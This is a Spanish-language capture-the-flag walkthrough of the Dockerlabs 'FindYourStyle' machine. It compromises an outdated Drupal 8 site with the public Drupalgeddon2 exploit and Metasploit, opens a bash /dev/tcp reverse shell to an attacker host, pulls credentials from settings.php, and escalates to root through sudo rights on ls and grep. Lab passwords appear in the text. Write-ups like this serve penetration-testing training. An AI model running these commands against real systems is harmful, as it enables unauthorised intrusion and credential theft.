
---
# Writeup Template: Maquina `[ FindYourStyle ]`

- Tags: #FindYourStyle 
- Dificultad: `[ Facil ]`
- Plataforma: `[ Dockerlabs ]`

---
## Enlace al laboratorio
[Maquina FindYourStyle](https://mega.nz/file/qEVWUKqR#3CheB213YMSaj-VUXSu1LOj2hlI7AwD-lQUbrtR_9W0) 

## Configuración del Entorno
```bash
# Comandos para desplegar el laboratorio
7z x findyourstyle.zip
sudo bash auto_deploy.sh findyourstyle.tar
```

---

## Fase de Reconocimiento
### Identificación del Target
Lanzamos una traza **ICMP** para determinar si tenemos conectividad con el target
```bash
ping -c 1 172.17.0.2
```

### Determinacion del SO
Usamos nuestra herramienta en python para determinar ante que tipo de sistema opertivo nos estamos enfrentando
```bash
wichSystem.py 172.17.0.2
# TTL: [ 64 ] -> [ Linux ]
```

---
## Enumeracion de Puertos y Servicios
### Descubrimiento de Puertos
```bash
# Escaneo rápido con herramienta personalizada en python
escanerTCP.py -t [IP_TARGET] -p [Rango_Puertos]

# Escaneo con Nmap
nmap -p- -sS --open --min-rate 5000 -vvv -n -Pn [IP_TARGET] -oG allPorts
extractPorts allPorts # Parseamos la informacion mas relevante del primer escaneo
```

### Análisis de Servicios
Realizamos un escaneo exhaustivo para determinar los servicios y las versiones que corren detreas de estos puertos
```bash
nmap -sCV -p[Puertos_Abiertos] [IP_TARGET] -oN targeted
```

**Servicios identificados:**
1. `[ 80 ]/[ TCP ]`: [ Apache ] ([ 2.4.25 ]) **ubuntuStretch**
---

## Enumeracion de [Servicio Web  Principal] `[ CMS Drupal ]`
### Tecnologías Detectadas
Realizamos deteccion de las tecnologias empleadas por la web
```bash
whatweb http://172.17.0.2
http://172.17.0.2 [200 OK] Apache[2.4.25], Content-Language[en], Country[RESERVED][ZZ], Drupal, HTML5, HTTPServer[Debian Linux][Apache/2.4.25 (Debian)], IP[172.17.0.2], MetaGenerator[Drupal 8 (https://www.drupal.org)], PHP[7.2.3], PoweredBy[-block], Script, Title[Welcome to Find your own Style | Find your own Style], UncommonHeaders[x-drupal-dynamic-cache,x-content-type-options,x-generator,x-drupal-cache], X-Frame-Options[SAMEORIGIN], X-Powered-By[PHP/7.2.3], X-UA-Compatible[IE=edge]
```

**Servicios identificados:**
1. `[ CMS ]/[ Drupal ]`: [ Drupal ] ([ 8 ]) # Tenemos una versions desactualizada: **The latest stable version of Drupal is Drupal 11**

Lanzamos un script de **Nmap** para reconocimiento de rutas
```bash
nmap --script http-enum -p [PORT] [IP_TARGET]
```

Resultado:
```bash
/rss.xml: RSS or Atom feed
/robots.txt: Robots file
/: Drupal version 8 
/README.txt: Interesting, a readme.
/contact/: Potentially interesting folder
```
### Descubrimiento de Rutas
```bash
gobuster dir -u http://172.17.0.2 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 --add-slash
```

**Hallazgos Relevantes:**
- `[ /user/ ]`: [ (Status: 302) [Size: 356] [--> http://172.17.0.2/user/login] ]
- `[ /search/ ]`: [ (Status: 302) [Size: 360] [--> http://172.17.0.2/search/node] ]
- `[ /node/ ]`: [ (Status: 200) [Size: 8756] ]
- `[ /Contact/ ]`: [ (Status: 200) [Size: 12117] ]

### Descubrimiento de Archivos
```bash
gobuster dir -u http://172.17.0.2 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 -x php,sh,txt,html,js,php.back
```

- **Hallazgos**:
```bash                                           
/index.php            (Status: 200) [Size: 8860
```

Tenemos la web principal:
```bash
http://172.17.0.2/index.php
```

### Uso de exploit `[ droopescan ]`
Sabiendo que tenemos una version de **drupal** desactualizada, Procedemos a buscar un exploit:
```bash
searchsploit drupal 8

Drupal < 7.58 / < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execution | php/webapps/44449.rb
```

Aqui podemos acceder al proyecto en **github** para poder clonarlo y ejecutarlo correctamente: [Drupalgeddon2](Ihttps://github.com/dreadlocked/Drupalgeddon2)
```bash
git clone https://github.com/dreadlocked/Drupalgeddon2.git --depth=1 
cd Drupalgeddon2
sudo gem install highline
```

---
## Explotacion de Vulnerabilidades
### Vector de Ataque
En el proyecto indica su modo de uso para poder aplicar esta herramienta para explotar el **CMS**
```bash
$ ruby drupalgeddon2.rb
Usage: ruby drupalggedon2.rb <target> [--verbose] [--authentication]
       ruby drupalgeddon2.rb https://example.com
```

### Ejecucion del Ataque
```bash
# Comandos para explotación
ruby drupalgeddon2.rb http://172.17.0.2
```

### Intrusion
Gracias al exploit **drupalgeddon2.rb** obtenemos una sesion como el usuario **www-data**

---

## Escalada de Privilegios
### Enumeracion del Sistema
Nos enviaremos una **revershell** a nuestro equipo de atacante:
```bash
# Desde nuestra maquina atacante
echo -n "bash -c 'exec bash -i &>/dev/tcp/IP/PORT <&1'" | base64
```

Nos ponemos en escucha:
```bash
nc -nlvp 443
```

### Usamos Metasploit
Usamos esta herramienta ya que tive problemas al entablar la **revershell**
```bash
msfconsole
```

buscamos el mismo **exploit** que anteriormente habiamos usado:
```bash
search drupal 8
```

Usaremos este:
```bash
0   exploit/unix/webapp/drupal_drupalgeddon2       2018-03-28       excellent  Yes    Drupal Drupalgeddon 2 Forms API Property Injection

use 0
```

Vemos las opciones que tenemos disponibles:
```bash
show options

# Tendremos que setear estos valores.
RHOSTS                        yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
```

Indicamos la direccion IP del target
```bash
set RHOST 172.17.0.2
```

Ejecutamos el **exploit**
```bash
msf6 exploit(unix/webapp/drupal_drupalgeddon2) > run
```

Una ves terminado estaremos de nuevo dentro del target:
Nos enviaremos una shell a nuestro equipo de atacante.
```bash
shell # Esto lo ejecutamos desde metasploit
```

Nos ponemos en escucha por el puerto 443
```bash
nc -nlvp 443
```

Nos enviamos la revershell
```bash
bash -c 'exec bash -i &>/dev/tcp/IP/PORT <&1'
```

Ahora tenemos una shell y podemos continurar con la enumeracion del sistema.
- **Archivos sensibles**: 
  - `/sites/default/settings.php` (Credenciales de la base de datos).

```bash
/var/www/html/sites/default # Aqui es la ruta exacta
```

Ahora filtraremos por la palabra clave: **password**
```bash
cat settings.php  | grep "password"
```

Tenemos la contrasena del usuario: `ballenita`
```bash
su ballenita # ( ballenitafeliz )
```

**Hallazgos Clave:**
- Binario con privilegios: `[ sites/default/settings.php ]`
- Credenciales de usuario: `[ ballenita ]:[ ballenitafeliz ]`

### Explotacion de Privilegios
Abusando de privilegios de usuario:
```bash
sudo -l

User ballenita may run the following commands on 8a20aa796a40:
    (root) NOPASSWD: /bin/ls, /bin/grep # Tenemos una via potencial
```

Tenemos este binario: **( ls )** y **( grep )**
**( ls )** Con este binario listaremos los archivos del usuario **root**
```bash
sudo /bin/ls -la /root
```

Tenemos un archivo: 
```bash
-rw-r--r--  1 root root   35 Oct 16  2024 secretitomaximo.txt
```

Ahora con el binario **( grep )** intentaremos ver su contenido
```bash
sudo /bin/grep '' /root/secretitomaximo.txt
```

Tenemos una posible contrasena de **root**
```bash
nobodycanfindthispasswordrootrocks
```

Nos intentamos loguear como root:
```bash
# Comando para escalar al usuario: ( root )
su root # ( nobodycanfindthispasswordrootrocks )
```

---

## Evidencia de Compromiso
```bash
# Captura de pantalla o output final
root@8a20aa796a40:~# whoami
root
```

---

## Lecciones Aprendidas
1. Aprendimos a enumerar el gestor de contenido **CMS Drupal**
2. Version de **drupal** desactualizada
3. Uso de exploit: **Drupal < 7.58 / < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execution | php/webapps/44449.rb**

## Recomendaciones de Seguridad
- Siempre tener actualizado a la ultima version
- Verificar el tipo de permisos con privilegio asignado a los usuarios.

